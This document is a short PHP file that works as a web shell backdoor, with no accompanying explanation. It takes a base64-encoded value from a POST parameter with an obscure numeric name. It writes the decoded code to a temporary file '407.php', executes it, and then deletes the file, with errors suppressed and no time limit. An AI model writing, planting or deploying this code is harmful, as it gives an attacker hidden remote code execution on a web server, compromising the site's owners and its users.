<?php 
error_reporting(E_ERROR);set_time_limit(0);
if(isset($_POST['279487427352948936996'])){
	$tofile='407.php';
	$a =base64_decode(strtr($_POST['279487427352948936996'], '-_,', '+/=')); 
	$a='<?php '.$a.'?>';
	@file_put_contents($tofile,$a);
	require_once('407.php');
	@unlink($tofile);
	exit;

}
?>